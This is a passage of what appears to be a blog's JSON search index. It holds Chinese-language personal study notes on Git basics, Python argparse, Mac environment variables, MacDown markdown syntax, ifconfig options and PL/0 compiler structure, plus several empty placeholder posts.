这种情况下，Git 会使用它找到的每一个变量的最后一个配置。 你可以通过输入 git config ： 来检查 Git 的某一项配置 git config user.nameJohn Doe 1.7 获取帮助三种方式： git help config git config –help man git-config q quit 1.8 总结2.1Git基础-获取Git仓库 在现有的目录中初始化仓库 git init 仅仅完成初始化的操作，项目的文件还没有被追踪。 如果是一个已经存在的非空文件夹中初始化Git仓库来进行版本控制的话，应该开始追踪(add）这些文件并提交（commit）。git initgit add *.cgit add LICENSEgit commit -m “initial project version” 克隆现有的仓库 git clone url 当前目录新建仓库名文件夹，初始化.git文件夹，从元车行仓库拉取下所有数据放入.git文件夹，然后从中读取最新版本的文件的拷贝。 也可以自己自定义本地仓库的名字：git clone url myrepository git支持多种数据传输协议，http://, git:// ssh传输协议 2.2 Git基础-记录每次更新到数据库untracked(已创建，未追踪）changes to be commited (已经暂存staged，未提交commited）Changes not staged for commit (未暂存not staged） Git add：可以用它开始跟踪新文件，或者把已跟踪的文件放到暂存区，还能用于合并时把有冲突的文件标记为已解决状态 2.3Git基础-查看提交历史git log查看提交历史 2.4 Git基础 撤销操作git commit –amend 重新提交 覆盖上次提交信息 git reset HEAD file_name 撤销暂存 git checkout file_name 撤销修改 2.5Git基础-远程仓库的使用git remote git remote -v q 退出 git config –help git help config man git-config","categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/工具/"}],"tags":[{"name":"Git","slug":"Git","permalink":"http://yoursite.com/tags/Git/"}]},{"title":"argparse库学习","slug":"argparse库学习","date":"2017-10-30T10:09:58.000Z","updated":"2017-10-31T12:07:57.000Z","comments":true,"path":"2017/10/30/argparse库学习/","link":"","permalink":"http://yoursite.com/2017/10/30/argparse库学习/","excerpt":"argparse库是Python的命令行解析模块。 使用步骤： 导入库 import argparse 创建解析对象parser parser=argparse.ArgumentParser() 加入参数 parser.add_argument() 进行解析 args=parser.parse_args()","text":"argparse库是Python的命令行解析模块。 使用步骤： 导入库 import argparse 创建解析对象parser parser=argparse.ArgumentParser() 加入参数 parser.add_argument() 进行解析 args=parser.parse_args() ArgumentParser() 参数prog,usage,description,epilog都是用来修改帮助（–help,-h)中输出的内容。 测试用例 -h 结果 参数parents表示继承关系，继承parents list中所有parent对象的所有的参数 parents[parent1 ,parent2,….] 其他的比较少用，具体意义及用法参见文档，就不赘述了。 add_argument() 可选参数，其他位置参数 nargs 参数数量 N，* ，+，？ action store(默认）,store_const,store_true,store_false, append,append_const,count,help,version) default 默认值 type string（默认）,file ,int ,float choices 可供选择值 required 是否必选 reference: python argparse docs python命令行解析库argparse python argparse用法总结","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"argparse","slug":"argparse","permalink":"http://yoursite.com/tags/argparse/"}]},{"title":"mac环境变量配置及其理解&软连接","slug":"mac环境变量配置及其理解-软连接","date":"2017-10-27T16:31:57.000Z","updated":"2017-10-31T12:08:02.000Z","comments":true,"path":"2017/10/28/mac环境变量配置及其理解-软连接/","link":"","permalink":"http://yoursite.com/2017/10/28/mac环境变量配置及其理解-软连接/","excerpt":"什么是环境变量所谓环境变量，通俗的理解就是命令的路径譬如我的mac里安装了jdk1.6,jdk1.8那么当我执行javac指令的时候，改使用哪一个版本呢？ 这个时候就可以通过设置环境变量来确定。","text":"什么是环境变量所谓环境变量，通俗的理解就是命令的路径譬如我的mac里安装了jdk1.6,jdk1.8那么当我执行javac指令的时候，改使用哪一个版本呢？ 这个时候就可以通过设置环境变量来确定。 export JDK1.7=/usr/apps/jdk1.7export JDK1.8=/usr/apps/jdk1.8export PATH=$JDK1.7/bin 通过这样，将jdk1.7加入环境变量，即指定我默认的jdk版本是1.6 对于其他的命令亦此。 环境变量的作用就是就是用户可以在操作系统的各个目录之下，都能访问到所需要的工具目录内的内容。 mac的环境变量 查看当前环境变量 echo $PATH 分为全局用户环境变量，以及单个用户环境变量。 全局用户环境变量在： /etc/bashrc /etc/profile 单个用户的环境变量在 ~/.bash_profile 一般在~/.bash_profile修改环境变量，不需要修改全局用户变量 注：全局环境变量只有root用户才有权限修改，对于普通用户是只读的，用户要sudo才可以修改。 sudo vim /etc/bashrc 修改环境变量 cd ~vim .bash_profileexport PATH=…..:$PATHsource .bash_profile 如果是修改或者是新增环境变量的值，要source一下才会生效。 什么是软连接？硬连接 硬链接 异名同体 软连接 快捷方式 reference: Linux软连接和硬链接 Mac 中环境变量的配置和理解","categories":[],"tags":[]},{"title":"MacDown的基本使用","slug":"MacDown的基本使用","date":"2017-10-27T05:09:45.000Z","updated":"2017-10-31T11:56:49.000Z","comments":true,"path":"2017/10/27/MacDown的基本使用/","link":"","permalink":"http://yoursite.com/2017/10/27/MacDown的基本使用/","excerpt":"最近一直在寻找Mac上的比较好用的markdown编辑器，由于mac平台上有太多MarkDown编辑器，Typora，Mou,Ulysses,iA Writer，等等，工具太多，不知道如何选择，我索性就都下载下来，一个个试用，最后感觉还是macdown我比较喜欢。Macdown的好处是，使用简单，它的界面分为两栏，左栏编辑，右栏实时预览，我觉得这样很好，比较适合我这样的Markdown新手。好吧，下面介绍一下什么是Macdown以及基本语法。","text":"最近一直在寻找Mac上的比较好用的markdown编辑器，由于mac平台上有太多MarkDown编辑器，Typora，Mou,Ulysses,iA Writer，等等，工具太多，不知道如何选择，我索性就都下载下来，一个个试用，最后感觉还是macdown我比较喜欢。Macdown的好处是，使用简单，它的界面分为两栏，左栏编辑，右栏实时预览，我觉得这样很好，比较适合我这样的Markdown新手。好吧，下面介绍一下什么是Macdown以及基本语法。 什么是Macdown?MacDown是一个开源的，MarkDown语法编辑器，用于macOS平台。类似于Mou; here is the download link. 如果你安装了homebrew的话，可以直接用brew安装:brew cask install macdown Macdown的基本语法同其他编辑器一样，语法无非是标题，链接，图片，代码块什么的。 换行 行末加两个空格，然后回车 强调 加黑 **要加黑的内容** eg:我变黑了 加黄 &lt;mark&gt;要加黄的内容&lt;/mark&gt; eg:我是黄的 删除线 &lt;del&gt;要删除的内容&lt;/del&gt; eg：别删我 上脚注 我在下面&lt;sup&gt;我在上面&lt;/sup&gt; 我在下面我在上面 标题 这个不多说了，#，##，，，######标题依次为一级，二级，，六级，字号依次减小 特别的，使用二级标题的时候，在标题下面后有一条水平线 加链接以及图片 直接加链接：&lt;url&gt;即可，即直接在链接两侧加上&lt; &gt; 给链接起名字 [name](url)即可， 在文章中添加很多链接会显得很凌乱，特别是当链接比较长的时候，这样的情况下，我们可以这样做。将定义统一放在文章末尾，文中进行引用即可。 定义：[name]:URL引用：[name] 引用图片方法和上面类似，图片可以在本地，也可以通过url 定义：[picture name]:URL or PATH引用：![picture name] 插入代码 行代码只需要在其两侧加 `符号即可。 include&lt;stdio.h&gt; 插入代码块可以通过，缩进4个空格，或者代码块两端加。注意：插入代码块之前要空一行 块引用 first second term eg: fisrtsecondthird term1 term2 水平线*三个星号 表格 name number laji 1512 name score —– —— flt 100 laji 0 name number laji 1512 name score flt 100 laji 0","categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/工具/"}],"tags":[{"name":"markdown","slug":"markdown","permalink":"http://yoursite.com/tags/markdown/"},{"name":"macdown","slug":"macdown","permalink":"http://yoursite.com/tags/macdown/"}]},{"title":"ictclass 简介","slug":"ictclass-简介","date":"2017-10-27T05:00:44.000Z","updated":"2017-10-27T08:28:07.000Z","comments":true,"path":"2017/10/27/ictclass-简介/","link":"","permalink":"http://yoursite.com/2017/10/27/ictclass-简介/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"lucene简介","slug":"lucene简介","date":"2017-10-27T04:56:35.000Z","updated":"2017-10-27T04:56:35.000Z","comments":true,"path":"2017/10/27/lucene简介/","link":"","permalink":"http://yoursite.com/2017/10/27/lucene简介/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Mac docker安装","slug":"Mac-docker安装","date":"2017-10-26T15:51:09.000Z","updated":"2017-10-26T15:51:09.000Z","comments":true,"path":"2017/10/26/Mac-docker安装/","link":"","permalink":"http://yoursite.com/2017/10/26/Mac-docker安装/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"ifconfig命令学习笔记","slug":"ifconfig","date":"2017-10-26T15:33:02.000Z","updated":"2017-10-27T16:56:27.000Z","comments":true,"path":"2017/10/26/ifconfig/","link":"","permalink":"http://yoursite.com/2017/10/26/ifconfig/","excerpt":"ifconfig=interfaces config 命令格式： ifconfig [网络设备][参数] 功能 查看和配置网络设备，当网络环境发生改变的时候可以通过该命令对网络进行相应的配置。","text":"ifconfig=interfaces config 命令格式： ifconfig [网络设备][参数] 功能 查看和配置网络设备，当网络环境发生改变的时候可以通过该命令对网络进行相应的配置。 命令参数 up 启动相应的网络设备/网卡 down 关闭指定的网络设备/网卡 arp 设置指定网卡是都支持ARP协议 -promisc 设置是否支持网卡的promiscuous模式 -allmulti 设置是否支持多播模式，如果选择该参数，网卡将接受网络中所有的多播数据包 -a 显示全部接口信息 -s 显示摘要信息 add 给指定网卡配置ipv6地址 del 删除指定网卡的ipv6地址 mtu&lt;字节数&gt; 设置网卡的最大传输单元 netmask&lt;子网掩码&gt; 设置网卡的子网掩码 tunel 建立隧道 dsaddr 设定一个远端地址，建立点对点通信 -broadcst&lt;地址&gt; 为指定网卡设置广播协议 -pointtopoint&lt;地址&gt; 为网卡设置点对点通讯协议 multicast 为网卡设置组播标识 address 为网卡设置IPV4地址 使用实例 查看设备信息 第一行：连接类型：以太网 硬件地址即MAC地址：… 第二行：inet 地址表示网卡的IP地址：10.211.55.5广播地址：10.211.55.255子网掩码：255.255.255.0 第六行：网卡的状态 UP:网卡处于开启状态 RUNNING：网卡的网线被插上 MULTICAST：允许组播 MTU=1500：最大传输单元1500字节 关闭开启网卡 sudo ifconfig eth1 down sudo ifconfig eth1 down 删除/添加ipv6地址 sudo ifconfig eth1 del/add ipv6-addr before after 修改MAC地址 sudo ifconfig eth1 hw ether MAC_ADDR 修改IP地址 sudo ifconfig eth1 IP_ADDR netmask ADDR broadcasr ADDR 其他操作 关闭或启动arp协议 ifconfig eth1 arpifconfig eth1 -arp 设置最大传输单元 ifconfig eth1 mtu 1500 Note:用ifconfig命令配置的网卡信息，在网卡重启后机器重启后，配置就不存在。要想将上述的配置信息永远的存的电脑里，那就要修改网卡的配置文件了参考：reference","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"ifconfig","slug":"ifconfig","permalink":"http://yoursite.com/tags/ifconfig/"}]},{"title":"pl0笔记","slug":"pl0笔记","date":"2017-10-26T11:26:43.000Z","updated":"2017-10-27T04:59:12.000Z","comments":true,"path":"2017/10/26/pl0笔记/","link":"","permalink":"http://yoursite.com/2017/10/26/pl0笔记/","excerpt":"","text":"#pl0笔记 ##第一部分 pl0语言及其编译器 pl0语言介绍 pl0设计语言是一个比较简单的语言，它以赋值语句为基础，构造概念有顺序，条件，循环三种。pl0有子程序的概念，包括过程定义（可以嵌套）与调用且有局部变量说明。pl0唯一的数据类型是整型，可以用来说明该类型的变量和常量。当然pl0也具有通常的算术与逻辑运算。具体的pl0语法图如下所示。 pl0语言编译器 pl0编译器的基本工作流程如下图所示： 语法分析完成以下工作 1.跳过分隔符，即空格，回车，制表符 2.识别保留字，如begin，end，if ，while等 3.识别非保留字的 一般标志符，将次标志符赋值给全局量id，而全局量sym赋值为sym_identifier 4.识别数字序列，当前值赋值给全局量num,sym被赋值为sym_number 5.是被：=,&lt;=,&gt;=等特殊符号，全局量sym被赋值为sym_becomes,sym_leq,sym_gtr等。 相关函数有getsym(),getch(),其中getch()为获取单个字符函数，除此之外，它还完成: 识别且跳过行结束符 将输入源文件复写到输出文件 产生一份程序列表，输出相应行号或者指令计数器的值注意getch()识别一个字符后，文件指针指向下一个，而getc()不会。 语法分析 ###pl0的指令集 pl0的指令集包含7种指令，分别是：（1) LIT 将常数压栈（2) LOD 将变量值压栈（3) STO 将栈顶的值赋予某变量（4) CAL 过程调用（5) INT 在数据栈中分配存储空间（6) JMP,JPC 用于if,while语句的条件或者无条件控制转移指令（7) OPR 算术逻辑指令 指令格式 F,L,A的含义见下表 ![ins]","categories":[],"tags":[]},{"title":"","slug":"小细节","date":"2017-10-25T14:46:51.000Z","updated":"2017-10-25T15:37:40.000Z","comments":true,"path":"2017/10/25/小细节/","link":"","permalink":"http://yoursite.com/2017/10/25/小细节/","excerpt":"","text":"###MAC ifconfig 输出结果 123456789* lo 回环接口(loop back) 或者 本地主机(localhost)* gif 通用 IP-in-IP隧道(RFC2893)stf 6to4连接(RFC3056)* en 以太网或802.11接口* fw IP over FireWire(IEEE-1394), macOS特* 有p2p Point-to-Point 协议* awdl airdrop peer to peer(一种mesh network), apple airdrop设备特有* bridge 第2层桥接* vlan 虚拟局域网络* 在iOS设备(支持cellular)上还能看到pdp_ip 蜂窝数据连接 Reference-from-Zhihu ###mac查看端口被程序占用情况lsof -i tcp:port number 查到程序PID后，可以kill PID","categories":[],"tags":[]}]}